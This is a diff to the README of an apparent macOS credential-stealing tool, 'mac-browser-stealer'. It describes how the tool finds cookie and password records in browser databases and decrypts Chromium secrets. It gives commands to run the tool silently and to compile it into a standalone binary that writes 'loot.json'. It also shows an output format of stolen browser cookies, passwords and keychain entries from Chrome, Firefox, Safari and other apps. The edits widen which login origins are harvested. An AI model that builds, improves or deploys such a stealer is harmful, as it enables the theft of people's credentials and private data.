@@ -41,7 +41,8 @@ native SQLite library (which would break `pkg` single-binary compilation),
 - `scanRecords(buf, colTypes, validator)` walks the whole file and returns every
   record whose column count and serial types match a table, filtered by a
   validator that rejects false positives (a `host_key` must look like a domain,
-  an `origin_url` must be an `http(s)` URL).
+  an `origin_url` must be a real login origin — `http(s)://`, `android://`
+  app-sync entries, or `file://`).
 
 ### Chromium cookie / password decryption
 
@@ -75,7 +76,7 @@ node stealer.js --quiet         # no console output
 ### Compile to a standalone binary
 
 ```sh
-npx pkg . --targets node20-macos-arm64,node20-macos-x64 --output dist/mac-browser-stealer
+npx pkg . --targets node18-macos-arm64,node18-macos-x64 --output dist/mac-browser-stealer
 ./dist/mac-browser-stealer --out loot.json
 ```
 
@@ -92,7 +93,7 @@ machine with no Node installed.
   "browsers": [
     {
       "name": "chrome",
-      "keychain_secret": "Zri8...",
+      "keychain_secret": "<base64 keychain value>",
       "profiles": [
         {
           "name": "Default",
@@ -104,12 +105,12 @@ machine with no Node installed.
   ],
   "firefox": {
     "profiles": [
-      { "path": ".../kiu19qjp.default-release", "cookies": [ ... ], "passwords": [ ... ] }
+      { "path": ".../<profile-dir>", "cookies": [ ... ], "passwords": [ ... ] }
     ]
   },
   "safari": { "exists": true, "keychain_key": "...", "cookies": [ ... ], "passwords": [ ... ] },
   "other_apps": [ ... ],
-  "keychain": { "total": 135, "entries": [ { "service": "...", "account": "...", "value": "..." } ] }
+  "keychain": { "total": "<n>", "entries": [ { "service": "...", "account": "...", "value": "..." } ] }
 }
 ```
 
